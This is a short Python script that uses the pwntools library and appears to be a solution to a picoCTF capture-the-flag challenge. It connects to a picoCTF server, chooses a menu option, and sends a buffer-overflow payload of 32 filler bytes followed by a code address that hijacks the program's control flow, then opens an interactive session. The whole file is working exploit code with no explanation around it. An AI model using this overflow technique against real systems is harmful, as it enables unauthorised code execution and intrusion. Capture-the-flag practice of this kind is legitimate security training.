#!/home/maxime/.pyvenv/bin/python3
from pwn import *

conn = connect("mimas.picoctf.net", 51447)

conn.recvuntil(b':')

conn.sendline(b'2')

conn.recvuntil(b':')

conn.sendline(b'0' * 32 + b'\xa0\x11\x40')

conn.interactive()

